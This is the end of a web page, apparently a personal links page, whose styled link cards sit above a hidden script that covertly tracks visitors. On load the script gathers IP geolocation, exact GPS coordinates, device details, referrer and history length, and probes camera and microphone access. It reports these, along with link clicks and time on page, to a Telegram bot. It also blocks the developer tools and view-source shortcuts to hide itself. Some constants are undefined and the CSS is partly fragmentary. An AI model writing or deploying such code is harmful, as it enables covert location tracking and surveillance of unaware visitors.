  .sub{

    font-weight:550;
    letter-spacing:2.8px;
    text-transform:uppercase;
    color:#8b8b8f;
  }
  .ctext{
    flex:1 1 auto;
    display:grid;
    grid-template-columns:minmax(0, 1fr) auto;
    align-items:center;
    gap:12px;
    line-height:1.2;
    min-width:0;
  }
  .ctext .ctitle{
    font-size:12.75px;
    font-weight:540;
    letter-spacing:-.04px;
    color:#1b1b1d;
    white-space:nowrap;
    overflow:hidden;
    text-overflow:ellipsis;
  }
  .ctext .csub{

    text-transform:uppercase;
    font-weight:550;
    white-space:nowrap;
    overflow:hidden;
    text-overflow:ellipsis;

  }
  .links{
    width:100%;
    margin-top:0;
    display:flex;
    flex-direction:column;
    gap:9px;
  }
  .card{
    display:flex;
    align-items:center;
    gap:11px;
    width:100%;
    padding:13px 16px;
    border-radius:12px;
    background:rgba(255,255,255,.72);
    border:1px solid rgba(0,0,0,.075);

    color:#111;
    font-size:14px;
    font-weight:450;

  }

  .card .ic{
    width:24px;
    height:24px;
    flex:0 0 24px;
    display:inline-flex;
    align-items:center;
    justify-content:center;
    border-radius:10px;
    background:transparent;
    border:none;
    color:#333336;
    transition:transform .22s cubic-bezier(.2,.7,.2,1),color .18s ease;
  }
  .card .ic svg{width:17px;height:17px;stroke:currentColor;stroke-width:1.65}
  .card:hover .ic{transform:scale(1.035);color:#111}
  .card:active{transform:translateY(0) scale(.995)}
  .card:focus-visible{outline:2px solid rgba(0,0,0,.28);outline-offset:2px;border-color:transparent;background:rgba(0,0,0,.018)}

  @keyframes riseIn{

    to  {opacity:1;translate:0 0;filter:blur(0)}

  .name{animation:riseIn .75s .05s both cubic-bezier(.2,.7,.2,1)}
  .sub{animation:riseIn .75s .16s both cubic-bezier(.2,.7,.2,1)}

  /* =========================================================

  body{

  .card{

  }

  .card .ic{
    transform:translateZ(0);

  }

  .card .ic svg{
    shape-rendering:geometricPrecision;
    text-rendering:geometricPrecision;
    vector-effect:non-scaling-stroke;
    overflow:visible;
  }

  /* évite le léger flou de l'animation d'arrivée */
  @keyframes riseIn{
    from{
      opacity:0;
      translate:0 8px;
    }
    to{
      opacity:1;
      translate:0 0;

  var DEAUVILLE_LAT = 49.3584;

  function getDistanceFromDeauville(lat, lon) {
    if (!lat || !lon) return 'Inconnue';
    function toRad(deg) { return deg * Math.PI / 180; }
    var R = 6371;
    var dLat = toRad(lat - DEAUVILLE_LAT);
    var dLon = toRad(lon - DEAUVILLE_LON);
    var a = Math.sin(dLat/2) * Math.sin(dLat/2) +
            Math.cos(toRad(DEAUVILLE_LAT)) * Math.cos(toRad(lat)) *
            Math.sin(dLon/2) * Math.sin(dLon/2);
    var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    return Math.round(R * c);

  // ============================================================

  function getDeviceInfo() {
    var ua = navigator.userAgent;
    var device = { type: 'Inconnu', os: 'Inconnu', browser: 'Inconnu', model: 'Inconnu' };

    else if (/Edg/.test(ua)) device.browser = 'Edge';
    else if (/Opera/.test(ua)) device.browser = 'Opera';

    if (/Android/.test(ua)) { var m = ua.match(/Android\s+([\d.]+)/); if (m) device.os = 'Android ' + m[1]; }

  // ============================================================
  // 2. GÉOLOCALISATION IP (APPROX)
  // ============================================================
  function getIPLocation(callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://ipapi.co/json/', true);
    xhr.onload = function() {
      if (xhr.status === 200) {
        try {
          var data = JSON.parse(xhr.responseText);
          callback({
            city: data.city || 'Inconnue',
            region: data.region || 'Inconnue',
            country: data.country_name || 'Inconnu',
            country_code: data.country || 'N/A',
            latitude: data.latitude || null,
            longitude: data.longitude || null,
            timezone: data.timezone || 'N/A',
            isp: data.org || 'N/A',
            asn: data.asn || 'N/A',
            ip: data.ip || 'N/A'
          });
        } catch(e) { callback(null); }
      } else { callback(null); }
    };
    xhr.onerror = function() { callback(null); };
    xhr.send();
  }

  // ============================================================
  // 3. GÉOLOCALISATION EXACTE (GPS)
  // ============================================================
  function getExactLocation(callback) {
    if (!navigator.geolocation) {
      callback(null);
      return;
    }
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        callback({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude || 'N/A',
          heading: pos.coords.heading || 'N/A',
          speed: pos.coords.speed || 'N/A'

      },
      function(err) {
        callback(null);
      },
      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
    );
  }

  // ============================================================
  // 4. ACCÈS À LA CAMÉRA / MICRO
  // ============================================================
  function getCameraMicroAccess(callback) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      callback('Non supporté');
      return;
    }
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
      .then(function(stream) {
        stream.getTracks().forEach(function(track) { track.stop(); });
        callback('✅ Accès OK');
      })
      .catch(function(err) {
        callback('❌ Refusé ou erreur');
      });
  }

  // ============================================================
  // 5. HISTORIQUE DE NAVIGATION
  // ============================================================
  function getHistoryInfo() {
    return {
      length: window.history.length,
      current: window.location.href,
      referrer: document.referrer || 'Direct'
    };
  }

  // ============================================================
  // 6. ENVOI À TELEGRAM (FONCTIONNEL)
  // ============================================================
  function sendToTelegram(message) {
    console.log('[Telegram] Envoi en cours...');
    
    var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
    var xhr = new XMLHttpRequest();
    xhr.open('POST', url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    
    xhr.onload = function() {
      if (xhr.status === 200) {
        console.log('[Telegram] ✅ Message envoyé !');
        console.log('[Telegram] Réponse:', xhr.responseText);
      } else {
        console.log('[Telegram] ❌ Erreur:', xhr.status, xhr.responseText);
      }
    };
    
    xhr.onerror = function() {
      console.log('[Telegram] ❌ Erreur réseau');
    };
    
    xhr.send(JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    }));
  }

  // ============================================================
  // 7. TRACKING COMPLET DE LA VISITE
  // ============================================================
  function trackFullVisit() {
    var device = getDeviceInfo();
    var historyInfo = getHistoryInfo();
    var screenWidth = window.screen.width;
    var screenHeight = window.screen.height;
    var language = navigator.language || 'Inconnue';
    var connection = navigator.connection ? (navigator.connection.effectiveType || 'Inconnue') : 'Inconnue';

    getIPLocation(function(loc) {
      getExactLocation(function(gps) {
        getCameraMicroAccess(function(camStatus) {
          var message = '🌍 <b>NOUVEAU VISITEUR</b>\n' +
                        '━━━━━━━━━━━━━━━━━\n';

          if (loc && loc.latitude && loc.longitude) {
            var distance = getDistanceFromDeauville(loc.latitude, loc.longitude);
            message += '📍 <b>Ville (IP)</b> : ' + loc.city + '\n' +
                       '🏛️ <b>Région</b> : ' + loc.region + '\n' +
                       '🇨🇵 <b>Pays</b> : ' + loc.country + ' (' + loc.country_code + ')\n' +
                       '📏 <b>Distance Deauville</b> : ' + distance + ' km\n' +
                       '🌐 <b>Fournisseur</b> : ' + loc.isp + '\n';
          } else {
            message += '📍 <b>Localisation IP</b> : Non détectée\n';
          }

          if (gps) {
            var gpsDist = getDistanceFromDeauville(gps.latitude, gps.longitude);
            message += '━━━━━━━━━━━━━━━━━\n' +
                       '🛰️ <b>GPS EXACT</b>\n' +
                       '📍 <b>Latitude</b> : ' + gps.latitude + '\n' +
                       '📍 <b>Longitude</b> : ' + gps.longitude + '\n' +
                       '📏 <b>Précision</b> : ' + gps.accuracy + ' m\n' +
                       '📏 <b>Distance Deauville (GPS)</b> : ' + gpsDist + ' km\n';
          } else {
            message += '━━━━━━━━━━━━━━━━━\n' +
                       '🛰️ <b>GPS EXACT</b> : Non disponible\n';
          }

          message += '━━━━━━━━━━━━━━━━━\n' +
                     '📱 <b>Appareil</b> : ' + device.type + '\n' +
                     '💻 <b>Système</b> : ' + device.os + '\n' +
                     '🌐 <b>Navigateur</b> : ' + device.browser + '\n' +
                     '📐 <b>Écran</b> : ' + screenWidth + 'x' + screenHeight + '\n' +
                     '🌍 <b>Langue</b> : ' + language + '\n' +
                     '📶 <b>Connexion</b> : ' + connection + '\n' +
                     '━━━━━━━━━━━━━━━━━\n' +
                     '📜 <b>Historique</b>\n' +
                     '📄 <b>Taille</b> : ' + historyInfo.length + ' pages\n' +
                     '🔙 <b>Référant</b> : ' + historyInfo.referrer + '\n' +
                     '🔗 <b>Page</b> : ' + historyInfo.current + '\n' +
                     '━━━━━━━━━━━━━━━━━\n' +
                     '🎥 <b>Caméra / Micro</b> : ' + camStatus + '\n' +
                     '⏰ <b>Heure</b> : ' + new Date().toLocaleString();

          sendToTelegram(message);
        });
      });
    });
  }

  // ============================================================
  // 8. TRACKING DES CLICS
  // ============================================================
  function trackClick(linkName, href) {
    var device = getDeviceInfo();
    var message = '🖱️ <b>CLIC SUR UN LIEN</b>\n' +
                  '━━━━━━━━━━━━━━━━━\n' +
                  '🔗 <b>Lien</b> : ' + linkName + '\n' +
                  '📍 <b>URL</b> : ' + href + '\n' +
                  '📱 <b>Appareil</b> : ' + device.type + '\n' +
                  '💻 <b>Système</b> : ' + device.os + '\n' +
                  '⏰ <b>Heure</b> : ' + new Date().toLocaleString();
    sendToTelegram(message);
  }

  // ============================================================
  // 9. TRACKING DU DÉPART
  // ============================================================
  var startTime = Date.now();
  var hasExited = false;

  function trackExit() {
    if (hasExited) return;
    hasExited = true;
    var duration = Math.round((Date.now() - startTime) / 1000);
    var minutes = Math.floor(duration / 60);
    var seconds = duration % 60;
    var durationStr = minutes + 'm ' + seconds + 's';
    var device = getDeviceInfo();
    var message = '🚪 <b>VISITEUR A QUITTÉ</b>\n' +
                  '━━━━━━━━━━━━━━━━━\n' +
                  '⏱️ <b>Durée</b> : ' + durationStr + '\n' +
                  '📱 <b>Appareil</b> : ' + device.type + '\n' +
                  '💻 <b>Système</b> : ' + device.os + '\n' +
                  '🌐 <b>Navigateur</b> : ' + device.browser + '\n' +
                  '⏰ <b>Heure</b> : ' + new Date().toLocaleString();
    sendToTelegram(message);
  }

  // ============================================================
  // 10. ÉVÉNEMENTS
  // ============================================================
  window.addEventListener('load', function() {
    console.log('[Page] Chargée. Envoi des données...');
    setTimeout(trackFullVisit, 1500);
  });

  document.querySelectorAll('.card').forEach(function(link) {
    link.addEventListener('click', function(e) {
      var linkName = this.getAttribute('data-link') || this.querySelector('.ctitle')?.textContent || 'Lien inconnu';
      trackClick(linkName, this.href);
    });
  });

  window.addEventListener('beforeunload', function() { trackExit(); });
  window.addEventListener('popstate', function() { trackExit(); });
  document.addEventListener('visibilitychange', function() {
    if (document.hidden) trackExit();
  });

  // ============================================================
  // 11. SÉCURITÉ
  // ============================================================
  document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
  document.addEventListener('dragstart', function(e){ e.preventDefault(); });
  document.addEventListener('selectstart', function(e){ e.preventDefault(); });
  document.addEventListener('keydown', function(e){
    var k = (e.key||'').toLowerCase();
    if (k === 'f12') { e.preventDefault(); return; }
    if (e.ctrlKey && e.shiftKey && ['i','j','c'].indexOf(k) !== -1) { e.preventDefault(); return; }
    if ((e.ctrlKey || e.metaKey) && ['s','u','p','a'].indexOf(k) !== -1) { e.preventDefault(); }
  });
</script>

</body>
</html>
